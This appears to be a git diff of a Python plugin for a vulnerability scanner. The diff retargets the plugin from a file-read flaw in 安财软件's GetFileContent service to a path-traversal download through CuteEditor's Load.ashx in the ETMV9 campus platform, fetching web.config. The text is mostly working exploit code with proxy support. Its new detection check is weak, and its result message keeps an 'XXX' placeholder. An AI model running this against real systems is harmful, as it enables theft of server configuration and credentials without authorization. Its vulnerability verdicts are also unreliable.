@@ -1,11 +1,11 @@
 #!/usr/bin/env python
 # -*- coding: utf-8 -*-
 '''
-name: 安财软件GetFileContent任意文件读取
-referer: http://www.wooyun.org/bugs/wooyun-2015-0121651
+name: ETMV9数字化校园平台任意下载
+referer: http://www.wooyun.org/bugs/wooyun-2015-0100796
 author: Lucifer
-modify: Ascotbe
-description: 文件/WS/WebService.asmx/GetFileContent中,参数fileName存在任意文件读取。
+description: 该校园平台使用了第三方编辑器CuteEditor，虽然删除了存在任意文件上传的漏洞文件uploader.ashx
+        （具体利用可参考白帽子zcgonvh的http://**.**.**.**/bugs/wooyun-2010-061932），与目录遍历漏洞文件browse_Img.asp，但是却忽略了任意文件包含漏洞文件Load.ashx。
 '''
 import urllib
 import requests
@@ -17,11 +17,7 @@ def UrlProcessing(url):
         res = urllib.parse.urlparse('http://%s' % url)
     return res.scheme, res.hostname, res.port
 
-post_data = {
-	"Content":"1",
-	"fileName":"web.config"
-}
-payload = "/WS/WebService.asmx/GetFileContent"
+payload = "/ETMDCP/CuteSoft_Client/CuteEditor/Load.ashx?type=image&file=../../../web.config"
 def medusa(Url,RandomAgent,ProxyIp):
 
     scheme, url, port = UrlProcessing(Url)
@@ -45,13 +41,13 @@ def medusa(Url,RandomAgent,ProxyIp):
                 # "http": "http://" + str(ProxyIps) , # 使用代理前面一定要加http://或者https://
                 "http": "http://" + str(ProxyIp)
             }
-            resp = requests.post(payload_url, data=post_data, headers=headers, proxies=proxies, timeout=5, verify=False)
+            resp = requests.get(payload_url, headers=headers, proxies=proxies, timeout=5, verify=False)
         elif ProxyIp==None:
-            resp = requests.post(payload_url, data=post_data,headers=headers, timeout=5, verify=False)
+            resp = requests.get(payload_url, headers=headers, timeout=5, verify=False)
         con = resp.text
         code = resp.status_code
-        if req.headers["Content-Type"] == "application/xml":
-            Medusa = "{} 安财软件GetFileContent任意文件读取漏洞\r\n漏洞详情:\r\nPayload:{}\r\nPost:{}\r\n".format(url, payload_url,post_data)
+        if resp.headers["Content-Type"] == "application/xml":
+            Medusa = "{} 存在XXX漏洞\r\n漏洞详情:\r\nPayload:{}\r\n".format(url, payload_url)
             return (Medusa)
     except Exception as e:
         pass
